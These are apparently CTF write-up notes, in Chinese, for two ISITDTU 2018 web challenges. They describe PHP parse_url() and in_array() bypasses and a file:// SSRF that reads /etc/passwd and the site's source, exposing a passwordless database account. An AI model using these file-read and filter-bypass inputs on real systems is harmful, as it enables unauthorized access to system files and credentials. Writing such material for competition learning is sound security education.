# ISITDTU CTF 2018 Quals - Notes

## IZ

考兩個洞:
1. parse_url() 存在一個漏洞，當 url 是 `http:/localhost///x.php?key=value` 會回傳 false
2. in_array() 是弱類型比較，然後將字串和數字比對時，會將字串轉數字，如果第一個字串的值不是數字則轉 0

所以輸入 `///?_=a` 就可以 get flag


## Friss
> Description: http://35.190.142.60/

打開頁面只有這一個視窗
![image](./img/5TTiIhc.png)

如果給 `file://etc/passwd`

會出現

```
string(3) "etc"
Only access to localhost
```

他要求必須是 localhost

所以改成 `file://localhost/etc/passwd`

就有東西
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ntp:x:112:116::/home/ntp:/bin/false ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash binhhuynhvanquoc:x:1001:1002::/home/binhhuynhvanquoc:/bin/bash mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
```

可以讀檔案後，就先來嘗試讀網頁原始碼: `file://localhost/var/www/html/index.php`

```php
<?php
include_once "config.php";
if (isset($_POST['url'])&&!empty($_POST['url']))
{
	$url = $_POST['url'];
	$content_url = getUrlContent($url);
}
else
{
	$content_url = "";
}
if(isset($_GET['debug']))
{
	show_source(__FILE__);
}


?>

```

這邊看到有 config.php ，再來讀: `file://localhost/var/www/html/config.php`

```php
<?php


$hosts = "localhost";
$dbusername = "ssrf_user";
$dbpasswd = "";
$dbname = "ssrf";
$dbport = 3306;

$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);

function initdb($conn)
{
	$dbinit = "create table if not exists flag(secret varchar(100));";
	if(mysqli_query($conn,$dbinit)) return 1;
	else return 0;
}

function safe($url)
{
	$tmpurl = parse_url($url, PHP_URL_HOST);
	if($tmpurl != "localhost" and $tmpurl != "127.0.0.1")
	{
		var_dump($tmpurl);
		die("<h1>Only access to localhost</h1>");
	}
	return $url;
}

function getUrlContent($url){
	$url = safe($url);
	$url = escapeshellarg($url);
	$pl = "curl ".$url;
	echo $pl;
	$content = shell_exec($pl);
	return $content;
}
initdb($conn);
?>

```

這邊可以看到幾個東西:
1. 給了我們一個沒有密碼的帳號
2. flag 在 db 中

這邊可以參考 [从一道CTF题目看Gopher攻击MySql](http://www.freebuf.com/articles/web/159342.html)


